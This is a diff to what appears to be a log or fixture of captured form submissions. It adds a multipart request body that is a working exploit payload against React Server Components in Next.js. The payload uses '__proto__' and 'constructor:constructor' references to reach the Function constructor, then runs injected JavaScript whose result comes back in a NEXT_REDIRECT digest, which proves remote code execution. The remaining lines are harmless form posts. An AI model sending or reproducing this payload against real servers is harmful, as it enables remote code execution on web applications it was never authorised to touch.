@@ -1,3 +1,16 @@
+------WebKitFormBoundaryx299245143201
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B\"}","_response":{"_prefix":"r = 53429+true+5600800;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx299245143201
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx299245143201
+------WebKitFormBoundaryx299245143201--
+
+Title=&User=&Content=omfg+no+way
+
 Title=&User=&Content=omfg+no+way
 
 Title=&User=&Content=d
